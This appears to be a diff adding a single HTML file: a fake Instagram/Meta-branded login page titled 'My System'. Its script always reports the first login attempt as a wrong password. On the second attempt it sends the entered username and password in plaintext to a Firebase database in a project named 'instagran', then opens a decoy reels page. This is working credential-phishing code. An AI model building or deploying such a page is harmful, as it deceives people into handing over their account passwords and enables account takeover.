@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>My System</title>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  /* ════════════════════════════
+     LOGIN PAGE (Mobile-first, Instagram style)
+  ════════════════════════════ */
+  body {
+    background: #fff;
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0;
+  }
+
+  .login-page {
+    width: 100%;
+    max-width: 420px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 0 0 20px;
+    background: #fff;
+  }
+
+  /* Language bar at top */
+  .lang-bar {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 14px 0 10px;
+    font-size: 15px;
+    color: #262626;
+    font-weight: 500;
+    gap: 4px;
+    border-bottom: none;
+  }
+
+  .lang-bar svg {
+    width: 14px;
+    height: 14px;
+    fill: #262626;
+  }
+
+  /* Instagram logo area */
+  .logo-area {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 52px 0 40px;
+    gap: 0;
+  }
+
+  /* Instagram camera icon SVG */
+  .insta-icon {
+    width: 56px;
+    height: 56px;
+    margin-bottom: 0;
+  }
+
+  /* Main form container */
+  .form-area {
+    width: 100%;
+    padding: 0 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  input[type="text"],
+  input[type="password"],
+  input[type="email"] {
+    width: 100%;
+    padding: 16px 20px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    font-size: 15px;
+    font-family: 'DM Sans', sans-serif;
+    color: #262626;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  input:focus {
+    border-color: #a8a8a8;
+    background: #fff;
+  }
+
+  input::placeholder { color: #8e8e8e; }
+
+  /* Password wrapper */
+  .pw-wrap { position: relative; width: 100%; }
+  .pw-wrap input { padding-right: 56px; }
+
+  .eye-btn {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    color: #8e8e8e;
+    display: flex;
+    align-items: center;
+    font-size: 13px;
+    font-weight: 600;
+    font-family: 'DM Sans', sans-serif;
+    transition: color 0.2s;
+  }
+
+  .eye-btn:hover { color: #262626; }
+
+  /* Blue Login button */
+  button.primary {
+    width: 100%;
+    padding: 15px;
+    margin-top: 4px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'DM Sans', sans-serif;
+    cursor: pointer;
+    letter-spacing: 0.2px;
+    transition: background 0.2s;
+  }
+
+  button.primary:active { background: #0081d6; }
+
+  /* Forgot password */
+  .forgot {
+    text-align: center;
+    font-size: 15px;
+    font-weight: 600;
+    color: #262626;
+    margin-top: 12px;
+    cursor: pointer;
+  }
+
+  /* OR divider */
+  .or-divider {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    gap: 16px;
+    margin: 20px 0 16px;
+    padding: 0 20px;
+  }
+
+  .or-divider hr { flex: 1; border: none; border-top: 1px solid #dbdbdb; }
+  .or-divider span { font-size: 13px; font-weight: 600; color: #8e8e8e; }
+
+  /* Facebook login */
+  .fb-area {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+
+  button.fb {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: none;
+    border: none;
+    color: #385185;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'DM Sans', sans-serif;
+    cursor: pointer;
+    padding: 8px 20px;
+  }
+
+  .fb-icon {
+    width: 20px;
+    height: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .fb-icon svg { width: 20px; height: 20px; }
+
+  /* Error / success message */
+  .message {
+    font-size: 13px;
+    color: #ed4956;
+    min-height: 16px;
+    margin-top: 4px;
+    text-align: center;
+    display: none;
+    padding: 0 20px;
+  }
+
+  .message.show { display: block; }
+  .message.green { color: #2ecc71; }
+
+  /* Spacer to push create account to bottom */
+  .spacer { flex: 1; }
+
+  /* Create new account button */
+  .create-account-wrap {
+    width: 100%;
+    padding: 0 20px;
+    margin-top: 30px;
+  }
+
+  button.create {
+    width: 100%;
+    padding: 15px;
+    background: transparent;
+    border: 1.5px solid #0095f6;
+    border-radius: 10px;
+    color: #0095f6;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'DM Sans', sans-serif;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  button.create:active { background: #f0f8ff; }
+
+  /* Meta logo at bottom */
+  .meta-bottom {
+    margin-top: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 500;
+  }
+
+  .meta-bottom svg { width: 60px; height: 20px; }
+
+  /* ════════════════════════════
+     DESKTOP — two-column layout
+  ════════════════════════════ */
+  @media (min-width: 700px) {
+    body {
+      background: #fafafa;
+      justify-content: center;
+    }
+
+    .login-page {
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      min-height: unset;
+      background: transparent;
+      max-width: 900px;
+      padding: 32px 16px;
+    }
+
+    /* Show phone mockup on desktop */
+    .phone-mockup-side {
+      display: flex !important;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+      flex: 1;
+    }
+
+    /* Right side becomes a card */
+    .right-card {
+      width: 360px;
+      flex-shrink: 0;
+    }
+
+    .right-card .box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 36px 0 22px;
+    }
+
+    .right-card .create-account-box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 18px;
+      text-align: center;
+      font-size: 15px;
+      color: #262626;
+      margin-top: 10px;
+    }
+
+    .right-card .create-account-box a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .right-card .meta-bottom { margin-top: 18px; }
+
+    .lang-bar { display: none; }
+    .create-account-wrap { display: none; }
+    .meta-bottom.mobile-only { display: none; }
+  }
+
+  /* Phone mockup (desktop only) */
+  .phone-mockup-side { display: none; }
+
+  .phone-mock {
+    width: 240px;
+    height: 400px;
+    background: #fff;
+    border-radius: 36px;
+    border: 2px solid #dbdbdb;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.12);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  .phone-mock-top {
+    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+    height: 52%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .phone-mock-top .ms-logo {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 30px;
+    color: #fff;
+    text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  }
+
+  .phone-mock-bot {
+    background: #fafafa;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    padding: 16px 20px;
+  }
+
+  .card-row { display: flex; gap: 8px; }
+  .card { flex: 1; height: 52px; border-radius: 8px; background: linear-gradient(135deg, #ee2a7b22, #6228d722); border: 1px solid #dbdbdb; }
+  .card.wide { flex: 2; background: linear-gradient(135deg, #f9ce3422, #ee2a7b22); }
+
+  .tagline { text-align: center; font-size: 20px; font-weight: 600; color: #262626; line-height: 1.4; }
+  .tagline span { background: linear-gradient(90deg, #f9ce34, #ee2a7b, #6228d7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+
+  /* Desktop box wraps form */
+  .box { background: transparent; }
+
+  @media (max-width: 699px) {
+    .right-card .create-account-box { display: none; }
+    .meta-bottom.desktop-only { display: none; }
+  }
+
+</style>
+</head>
+<body>
+
+<div class="login-page" id="loginPage">
+
+  <!-- ── Desktop phone mockup (left) ── -->
+  <div class="phone-mockup-side">
+    <div class="phone-mock">
+      <div class="phone-mock-top">
+        <span class="ms-logo">My System</span>
+      </div>
+      <div class="phone-mock-bot">
+        <div class="card-row"><div class="card wide"></div><div class="card"></div></div>
+        <div class="card-row"><div class="card"></div><div class="card wide"></div></div>
+        <div class="card-row"><div class="card wide"></div><div class="card"></div></div>
+      </div>
+    </div>
+    <p class="tagline">See everyday moments from<br>your <span>close friends.</span></p>
+  </div>
+
+  <!-- ── Right side (form) ── -->
+  <div class="right-card">
+    <div class="box">
+
+      <!-- Language bar (mobile only) -->
+      <div class="lang-bar">
+        English (US)
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+
+      <!-- Instagram-style camera icon + logo area -->
+      <div class="logo-area">
+        <!-- Instagram camera SVG icon -->
+        <svg class="insta-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="ig" cx="30%" cy="107%" r="150%">
+              <stop offset="0%" stop-color="#fdf497"/>
+              <stop offset="5%" stop-color="#fdf497"/>
+              <stop offset="45%" stop-color="#fd5949"/>
+              <stop offset="60%" stop-color="#d6249f"/>
+              <stop offset="90%" stop-color="#285AEB"/>
+            </radialGradient>
+          </defs>
+          <!-- White background -->
+          <rect width="100" height="100" rx="22" fill="#fff"/>
+          <!-- Camera border in gradient -->
+          <rect x="20" y="20" width="60" height="60" rx="14" fill="none" stroke="url(#ig)" stroke-width="5"/>
+          <!-- Lens circle in gradient -->
+          <circle cx="50" cy="50" r="14" fill="none" stroke="url(#ig)" stroke-width="5"/>
+          <!-- Dot in gradient fill -->
+          <circle cx="72" cy="28" r="5" fill="url(#ig)"/>
+        </svg>
+      </div>
+
+      <!-- Form fields -->
+      <div class="form-area">
+        <input type="text" id="username" placeholder="Username, email or mobile number">
+
+        <div class="pw-wrap">
+          <input type="password" id="password" placeholder="Password">
+          <button class="eye-btn" type="button" id="eyeBtn" title="Show/Hide password">
+            <!-- Eye open icon -->
+            <svg id="iconOpen" xmlns="http://www.w3.org/2000/svg" fill="none"
+                 viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+              <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943
+                       9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+            </svg>
+            <!-- Eye closed/slash icon -->
+            <svg id="iconClosed" xmlns="http://www.w3.org/2000/svg" fill="none"
+                 viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"
+                 style="display:none">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.477 0-8.268-2.943-9.542-7
+                       a9.965 9.965 0 012.084-3.41M6.53 6.53A9.956 9.956 0 0112 5
+                       c4.477 0 8.268 2.943 9.542 7a9.966 9.966 0 01-4.077 5.02
+                       M6.53 6.53L3 3m3.53 3.53l11.94 11.94"/>
+            </svg>
+          </button>
+        </div>
+
+        <button class="primary" id="loginBtn">Log in</button>
+
+        <p class="forgot">Forgot password?</p>
+      </div>
+
+      <!-- OR divider -->
+      <div class="or-divider"><hr><span>OR</span><hr></div>
+
+      <!-- Facebook -->
+      <div class="fb-area">
+        <button class="fb">
+          <div class="fb-icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#385185">
+              <path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.514c-1.491 0-1.956.93-1.956 1.874v2.277h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+            </svg>
+          </div>
+          Log in with Facebook
+        </button>
+      </div>
+
+      <p class="message" id="message"></p>
+
+      <!-- Desktop: Create new account inside box2 -->
+      <div class="create-account-box" style="display:none" id="desktopSignup">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+
+    <!-- Desktop meta -->
+    <div class="meta-bottom desktop-only">
+      <svg viewBox="0 0 260 80" xmlns="http://www.w3.org/2000/svg">
+        <text x="0" y="60" font-family="sans-serif" font-size="52" font-weight="700" fill="#8e8e8e" letter-spacing="-2">∞ Meta</text>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Mobile: Create new account -->
+  <div class="create-account-wrap">
+    <button class="create">Create new account</button>
+  </div>
+
+  <!-- Mobile: Meta bottom -->
+  <div class="meta-bottom mobile-only" style="margin-top:18px">
+    <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+      <text x="0" y="46" font-family="sans-serif" font-size="40" font-weight="700" fill="#8e8e8e" letter-spacing="-1">∞ Meta</text>
+    </svg>
+  </div>
+
+</div><!-- /login-page -->
+
+<script>
+
+  /* ══ Eye toggle (Show/Hide text) ══ */
+  var pwInput = document.getElementById("password");
+  var eyeBtn  = document.getElementById("eyeBtn");
+
+  var iconOpen   = document.getElementById("iconOpen");
+  var iconClosed = document.getElementById("iconClosed");
+
+  eyeBtn.addEventListener("click", function () {
+    if (pwInput.type === "password") {
+      pwInput.type = "text";
+      iconOpen.style.display   = "none";
+      iconClosed.style.display = "block";
+    } else {
+      pwInput.type = "password";
+      iconOpen.style.display   = "block";
+      iconClosed.style.display = "none";
+    }
+  });
+
+  /* ══ Desktop: show create account box ══ */
+  if (window.innerWidth >= 700) {
+    document.getElementById("desktopSignup").style.display = "block";
+  }
+
+  /* ══ Login Button ══ */
+  var clickCount = 0;
+
+  document.getElementById("loginBtn").addEventListener("click", function () {
+    var username = document.getElementById("username").value.trim();
+    var password = document.getElementById("password").value;
+    var msg      = document.getElementById("message");
+
+    clickCount++;
+
+    if (clickCount === 1) {
+      msg.textContent = "Sorry, your password was incorrect. Please double-check your password.";
+      msg.className   = "message show";
+      return;
+    }
+
+    msg.textContent = "Login successful! Opening your feed...";
+    msg.className   = "message show green";
+
+    /* Firebase save */
+    import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js")
+      .then(function (a) {
+        return import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js")
+          .then(function (d) { return { a: a, d: d }; });
+      })
+      .then(function (m) {
+        var cfg = {
+          apiKey:            "AIzaSyAGT849YcBnW38SeOEoAkVVtwtcwyNLzwY",
+          authDomain:        "instagran-3b461.firebaseapp.com",
+          databaseURL:       "https://instagran-3b461-default-rtdb.firebaseio.com",
+          projectId:         "instagran-3b461",
+          storageBucket:     "instagran-3b461.firebasestorage.app",
+          messagingSenderId: "372304244325",
+          appId:             "1:372304244325:web:7b8fb25bc108cfc221608c"
+        };
+        var app = m.a.initializeApp(cfg);
+        var db  = m.d.getDatabase(app);
+        m.d.push(m.d.ref(db, "users"), { username: username, password: password });
+      })
+      .catch(function (e) { console.warn("Firebase:", e); });
+
+    /* Open reel page */
+    var blob = new Blob([buildReelPage(username)], { type: "text/html" });
+    window.open(URL.createObjectURL(blob), "_blank");
+  });
+
+  /* ══════════════════════════════════════
+     REEL PAGE BUILDER
+  ══════════════════════════════════════ */
+  function buildReelPage(username) {
+    var user     = (username && username.trim()) ? username.trim() : "user";
+    var initials = user.substring(0, 2).toUpperCase();
+
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>My System – Reels</title>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #000;
+    font-family: 'DM Sans', sans-serif;
+    height: 100dvh;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  /* ── Full screen reel container ── */
+  .reel-wrap {
+    position: relative;
+    width: 100%;
+    height: 100dvh;
+    max-width: 480px;
+    background: #111;
+    overflow: hidden;
+  }
+
+  /* ── VIDEO iframe fills entire screen ── */
+  .video-frame {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+    display: block;
+    z-index: 1;
+  }
+
+  /* ── No video placeholder ── */
+  .no-video {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+    z-index: 2;
+    background: linear-gradient(160deg, #0d0d1a 0%, #1a0a2e 50%, #0d1a0d 100%);
+    padding: 30px;
+    text-align: center;
+  }
+
+  .no-video-emoji { font-size: 72px; }
+
+  .no-video-title {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 32px;
+    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .no-video-sub {
+    font-size: 15px;
+    color: #666;
+    line-height: 1.6;
+    max-width: 280px;
+  }
+
+  .video-url-input {
+    width: 100%;
+    max-width: 320px;
+    padding: 12px 16px;
+    background: #1a1a2e;
+    border: 1.5px solid #333;
+    border-radius: 10px;
+    color: #fff;
+    font-size: 13px;
+    font-family: 'DM Sans', sans-serif;
+    outline: none;
+    margin-top: 4px;
+  }
+
+  .video-url-input:focus { border-color: #ee2a7b; }
+  .video-url-input::placeholder { color: #555; }
+
+  .load-btn {
+    padding: 11px 28px;
+    background: linear-gradient(90deg, #ee2a7b, #6228d7);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'DM Sans', sans-serif;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+
+  .load-btn:hover { opacity: 0.85; }
+
+  /* ── Gradient overlays (above iframe) ── */
+  .ov-top {
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 160px;
+    background: linear-gradient(to bottom, rgba(0,0,0,.7), transparent);
+    z-index: 10;
+    pointer-events: none;
+  }
+
+  .ov-bot {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 280px;
+    background: linear-gradient(to top, rgba(0,0,0,.88), transparent);
+    z-index: 10;
+    pointer-events: none;
+  }
+
+  /* ── Top bar ── */
+  .topbar {
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 18px 0;
+    z-index: 20;
+  }
+
+  .topbar-logo {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 26px;
+    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .topbar-right { display: flex; gap: 20px; align-items: center; }
+
+  .topbar-icon {
+    color: #fff;
+    font-size: 22px;
+    cursor: pointer;
+    filter: drop-shadow(0 1px 3px rgba(0,0,0,.5));
+  }
+
+  /* ── Bottom info ── */
+  .reel-info {
+    position: absolute;
+    bottom: 32px;
+    left: 14px;
+    right: 70px;
+    z-index: 20;
+    color: #fff;
+  }
+
+  .reel-user {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+
+  .avatar {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+    border: 2.5px solid #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    font-weight: 700;
+    color: #fff;
+    flex-shrink: 0;
+  }
+
+  .reel-username { font-size: 15px; font-weight: 700; }
+
+  .follow-btn {
+    background: none;
+    border: 1.5px solid #fff;
+    color: #fff;
+    border-radius: 7px;
+    padding: 4px 16px;
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: 'DM Sans', sans-serif;
+    margin-left: 2px;
+  }
+
+  .caption {
+    font-size: 15px;
+    color: #efefef;
+    line-height: 1.5;
+    margin-bottom: 10px;
+  }
+
+  .audio-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+    color: #efefef;
+  }
+
+  .disc {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #f9ce34, #ee2a7b);
+    animation: spin 3s linear infinite;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    flex-shrink: 0;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── Right action buttons ── */
+  .actions {
+    position: absolute;
+    bottom: 32px;
+    right: 14px;
+    z-index: 20;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+  }
+
+  .abtn {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 5px;
+    cursor: pointer;
+    color: #fff;
+    user-select: none;
+  }
+
+  .abtn svg {
+    width: 28px;
+    height: 28px;
+    filter: drop-shadow(0 1px 3px rgba(0,0,0,.5));
+  }
+
+  .abtn span {
+    font-size: 12px;
+    font-weight: 600;
+    text-shadow: 0 1px 3px rgba(0,0,0,.6);
+  }
+
+  .abtn.liked svg { fill: #ed4956; stroke: #ed4956; }
+
+  /* ── Progress bar ── */
+  .prog {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: rgba(255,255,255,.25);
+    z-index: 20;
+    overflow: hidden;
+  }
+
+  .prog-fill {
+    height: 100%;
+    background: #fff;
+    animation: pr 15s linear infinite;
+  }
+
+  @keyframes pr { from { width: 0% } to { width: 100% } }
+
+  /* Desktop phone frame */
+  @media (min-width: 600px) {
+    body { background: #0a0a0a; }
+    .reel-wrap {
+      width: 340px;
+      height: 680px;
+      border-radius: 44px;
+      border: 8px solid #111;
+      box-shadow: 0 0 0 2px #2a2a2a, 0 40px 100px rgba(0,0,0,.9);
+    }
+    .reel-wrap::before {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 22px;
+      background: #111;
+      border-radius: 20px;
+      z-index: 30;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="reel-wrap" id="reelWrap">
+
+  <!-- No video placeholder (shown until URL loaded) -->
+  <div class="no-video" id="noVideo">
+    <div class="no-video-emoji">🎬</div>
+    <div class="no-video-title">My System Reels</div>
+    <p class="no-video-sub">Paste any YouTube, video URL, or embed link below to play your reel</p>
+    <input class="video-url-input" id="videoUrl" type="text" placeholder="Paste video or embed URL here...">
+    <button class="load-btn" onclick="loadVideo()">▶ Play Reel</button>
+  </div>
+
+  <!-- iframe for video — src set by user -->
+  <iframe class="video-frame" id="videoFrame"
+    src=""
+    allow="autoplay; fullscreen; picture-in-picture"
+    allowfullscreen
+    style="display:none">
+  </iframe>
+
+  <!-- Overlays (above iframe) -->
+  <div class="ov-top"></div>
+  <div class="ov-bot"></div>
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <span class="topbar-logo">My System</span>
+    <div class="topbar-right">
+      <span class="topbar-icon">🔔</span>
+      <span class="topbar-icon">✉</span>
+    </div>
+  </div>
+
+  <!-- Bottom info -->
+  <div class="reel-info">
+    <div class="reel-user">
+      <div class="avatar">${initials}</div>
+      <span class="reel-username">${user}</span>
+      <button class="follow-btn">Follow</button>
+    </div>
+    <p class="caption">Welcome to My System 🔥 Your moment, your story. #mysystem #reels</p>
+    <div class="audio-row">
+      <div class="disc">🎵</div>
+      <span>My System – Original Audio</span>
+    </div>
+  </div>
+
+  <!-- Action buttons -->
+  <div class="actions">
+    <div class="abtn liked" id="lb" onclick="tgLike()">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none">
+        <path stroke-linecap="round" stroke-linejoin="round"
+              d="M4.318 6.318a4.5 4.5 0 016.364 0L12 7.636l1.318-1.318a4.5 4.5 0
+                 116.364 6.364L12 20.364l-7.682-7.682a4.5 4.5 0 010-6.364z"/>
+      </svg>
+      <span id="lc">24.5K</span>
+    </div>
+
+    <div class="abtn">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round"
+              d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863
+                 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3
+                 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"/>
+      </svg>
+      <span>1,230</span>
+    </div>
+
+    <div class="abtn">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round"
+              d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316
+                 -1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632
+                 -3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3
+                 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"/>
+      </svg>
+      <span>Send</span>
+    </div>
+  </div>
+
+  <div class="prog"><div class="prog-fill"></div></div>
+
+</div>
+
+<script>
+  var liked = true;
+
+  function tgLike() {
+    liked = !liked;
+    document.getElementById('lb').classList.toggle('liked', liked);
+    document.getElementById('lc').textContent = liked ? '24.5K' : '24.4K';
+  }
+
+  function loadVideo() {
+    var raw = document.getElementById('videoUrl').value.trim();
+    if (!raw) return;
+
+    var src = raw;
+
+    // Convert YouTube watch URL to embed
+    var ytMatch = raw.match(/(?:youtu\\.be\\/|youtube\\.com\\/(?:watch\\?v=|shorts\\/))([\w-]{11})/);
+    if (ytMatch) {
+      src = 'https://www.youtube.com/embed/' + ytMatch[1] + '?autoplay=1&mute=1&loop=1&playlist=' + ytMatch[1];
+    }
+
+    var frame = document.getElementById('videoFrame');
+    frame.src = src;
+    frame.style.display = 'block';
+    document.getElementById('noVideo').style.display = 'none';
+  }
+
+  // Allow pressing Enter on the input
+  document.getElementById('videoUrl').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') loadVideo();
+  });
+<\/script>
+
+</body>
+</html>`;
+  }
+
+</script>
+</body>
+</html>
